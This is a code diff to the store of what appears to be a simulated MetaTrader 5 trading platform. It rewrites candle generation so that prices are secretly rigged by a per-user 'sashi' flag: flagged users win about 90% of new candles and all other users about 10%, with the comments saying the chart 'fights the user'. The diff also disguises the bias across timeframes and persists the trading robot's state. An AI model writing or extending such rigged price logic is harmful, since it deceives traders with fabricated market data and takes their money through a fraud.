@@ -64,6 +64,7 @@ const KEYS = {
   candles: "mt5_candles_v1",
   selectedSymbol: "mt5_sel_symbol",
   selectedTf: "mt5_sel_tf",
+  eaState: "mt5_ea_state",
 };
 
 // ====================== PRICE PERSISTENCE ======================
@@ -241,7 +242,13 @@ export function getCandles(symbol: string, tf: Timeframe): Candle[] {
   return store[key];
 }
 
-// ====================== IMPROVED SASHI BIAS (Realistic + Opposite for non-Sashi) ======================
+// ====================== SASHI BIAS (90% win-rate for sashi, 10% for non-sashi) ======================
+// New candles that form while the user has an open position bias in the
+// direction that MAKES THE USER WIN. sashi=true -> 90% of new candles close in
+// the user's favor (mostly bullish if user is long, mostly bearish if short).
+// sashi=false -> only 10% close in the user's favor (chart fights the user).
+// Timeframes above M5 also get biased but with a softer magnitude so the
+// higher-TF picture stays coherent with what the user sees on the M1/M5.
 export function tickCandles() {
   if (typeof window === "undefined") return;
 
@@ -249,6 +256,7 @@ export function tickCandles() {
   let changed = false;
   const positions = mt5Store.getPositions();
   const isSashi = mt5Store.isSashi;
+  const favorChance = isSashi ? 0.9 : 0.1;
 
   for (const sym of SYMBOLS) {
     for (const tf of TIMEFRAMES) {
@@ -264,51 +272,43 @@ export function tickCandles() {
       if (bucket > last.t) {
         let closePrice = sym.price;
 
-        const relevant = positions.filter(p => p.symbol === sym.symbol);
-        const net = relevant.reduce((sum, p) => {
-          return sum + (p.side === "buy" ? p.volume : -p.volume);
-        }, 0);
+        const net = positions
+          .filter((p) => p.symbol === sym.symbol)
+          .reduce((s, p) => s + (p.side === "buy" ? p.volume : -p.volume), 0);
 
-        if (net !== 0 && (tf === "M1" || tf === "M5")) {
-          const isLong = net > 0;
-          const isShort = net < 0;
+        if (net !== 0) {
+          const userDir = net > 0 ? 1 : -1;
+          const favor = Math.random() < favorChance;
+          const dir = favor ? userDir : -userDir;
 
-          let desiredDirection = 0;
+          // Softer bias on higher TFs so they aren't wildly divergent.
+          const tfScale =
+            tf === "M1" || tf === "M5" ? 1
+              : tf === "M15" || tf === "M30" ? 0.6
+                : tf === "H1" ? 0.4
+                  : 0.25;
 
-          if (isSashi) {
-            if (isLong) desiredDirection = 1;
-            if (isShort) desiredDirection = -1;
-          } else {
-            if (isLong) desiredDirection = -1;
-            if (isShort) desiredDirection = 1;
-          }
-
-          if (desiredDirection !== 0) {
-            const biasStrength = isSashi ? 0.00075 : 0.00038;
-            const favorChance = 0.85;
-            const shouldFavor = Math.random() < favorChance;
-
-            if (shouldFavor) {
-              closePrice = sym.price * (1 + desiredDirection * biasStrength);
-            } else {
-              closePrice = sym.price * (1 + (Math.random() - 0.5) * biasStrength * 0.6);
-            }
-
-            const momentum = (sym.price - last.c) * 0.25;
-            closePrice = closePrice * (1 + momentum * 0.0004);
-          }
+          const biasStrength = 0.0009 * tfScale; // ~0.09% move in chosen direction
+          const jitter = (Math.random() * 0.7 + 0.3); // 0.3..1.0
+          closePrice = sym.price * (1 + dir * biasStrength * jitter);
         } else {
           const normalVol = tf === "M1" || tf === "M5" ? 0.00028 : 0.00018;
           closePrice = sym.price * (1 + (Math.random() - 0.5) * normalVol);
         }
 
-        arr.push({
-          t: bucket,
-          o: last.c,
-          h: Math.max(last.c, closePrice, sym.price),
-          l: Math.min(last.c, closePrice, sym.price),
-          c: closePrice,
-        });
+        closePrice = +closePrice.toFixed(sym.digits);
+
+        // Ensure the candle body clearly reflects the biased direction:
+        // open at previous close, close in the biased direction.
+        const open = last.c;
+        const high = Math.max(open, closePrice, sym.price);
+        const low = Math.min(open, closePrice, sym.price);
+
+        arr.push({ t: bucket, o: open, h: high, l: low, c: closePrice });
+
+        // Also nudge the live symbol price to the new close so subsequent
+        // ticks continue from the biased level (keeps chart and ticks aligned).
+        sym.price = closePrice;
 
         if (arr.length > 420) arr.shift();
       } else {
@@ -339,6 +339,14 @@ function seedRobots(): MT5Robot[] {
 let eaInterval: any = null;
 let isInCooldown = false;
 const CYCLE_COOLDOWN = 10000;
+// EA batch exit rules:
+//  - TAKE PROFIT: close the whole batch as soon as its combined PnL is in
+//    profit by at least this amount (was $5 before — batches at +$1..$4
+//    never closed, which looked like "profits never close").
+const EA_TAKE_PROFIT = 0.5;
+//  - STOP LOSS: cut the batch when combined loss reaches this level
+//    (applies to ALL users so a batch can never bleed forever).
+const EA_STOP_LOSS = -30;
 
 export const mt5Store = {
   getAccount: (): MT5Account | null => {
@@ -376,7 +384,7 @@ export const mt5Store = {
   eaMaxPositions: 5,
   eaSymbol: "",
 
-  startEA: (maxPositions: number) => {
+  startEA: (maxPositions: number, robotId: number | null = null) => {
     mt5Store.isEaRunning = true;
     mt5Store.eaMaxPositions = maxPositions;
     mt5Store.eaSymbol = mt5Store.getSelectedSymbol();
@@ -385,6 +393,17 @@ export const mt5Store = {
     if (eaInterval) clearInterval(eaInterval);
 
     eaInterval = setInterval(() => mt5Store.runEAStep(), 3000);
+
+    // PERSIST the running state so navigating away and back (or reloading
+    // the page) keeps the robot showing as RUNNING. Only an explicit user
+    // Stop click clears this.
+    write(KEYS.eaState, {
+      running: true,
+      maxPositions,
+      symbol: mt5Store.eaSymbol,
+      robotId,
+    });
+
     console.log(`[EA] Started with max ${maxPositions} positions`);
   },
 
@@ -395,7 +414,32 @@ export const mt5Store = {
       eaInterval = null;
     }
     isInCooldown = false;
+    write(KEYS.eaState, { running: false, maxPositions: 5, symbol: "", robotId: null });
     console.log("[EA] Stopped");
+  },
+
+  // Read the persisted EA state (survives navigation & page reloads).
+  getEAState: () =>
+    read<{ running: boolean; maxPositions: number; symbol: string; robotId: number | null }>(
+      KEYS.eaState,
+      { running: false, maxPositions: 5, symbol: "", robotId: null },
+    ),
+
+  // Call this on mount of the Bots screen (or any MT5 screen): if the EA
+  // was running according to persisted state but the interval died (page
+  // reload / fresh navigation), silently restart the engine so trades keep
+  // opening/closing per the logic until the USER presses Stop.
+  resumeEA: (): boolean => {
+    const st = mt5Store.getEAState();
+    if (!st.running) return false;
+    mt5Store.isEaRunning = true;
+    mt5Store.eaMaxPositions = st.maxPositions || 5;
+    mt5Store.eaSymbol = st.symbol || mt5Store.getSelectedSymbol();
+    if (!eaInterval) {
+      eaInterval = setInterval(() => mt5Store.runEAStep(), 3000);
+      console.log("[EA] Resumed after navigation/reload");
+    }
+    return true;
   },
 
   stopEAAndClosePositions: async () => {
@@ -469,13 +513,19 @@ export const mt5Store = {
 
     const symbol = mt5Store.eaSymbol || mt5Store.getSelectedSymbol();
     const maxPos = mt5Store.eaMaxPositions;
-    const isSashi = mt5Store.isSashi;
 
     let currentBatch = mt5Store.getPositions().filter(p => p.symbol === symbol);
 
     if (currentBatch.length > 0) {
       const totalPnL = currentBatch.reduce((sum, p) => sum + calcProfit(p), 0);
-      const shouldClose = isSashi ? totalPnL > 5 : totalPnL < -35;
+      // FIXED (v2): the batch closes as soon as it is IN PROFIT (>= $0.50
+      // combined), for BOTH sashi and non-sashi users. The old ">$5" gate
+      // meant a batch sitting at +$1..$4 never took profit, so it drifted
+      // back into loss and only the -$35 loss cut ever fired. The loss cut
+      // now applies to everyone at -$30 so no batch can bleed forever.
+      // Cycle: open batch -> in profit? close & credit balance -> cooldown
+      // -> open next batch -> repeat until the user presses Stop.
+      const shouldClose = totalPnL >= EA_TAKE_PROFIT || totalPnL <= EA_STOP_LOSS;
 
       if (shouldClose) {
         isInCooldown = true;
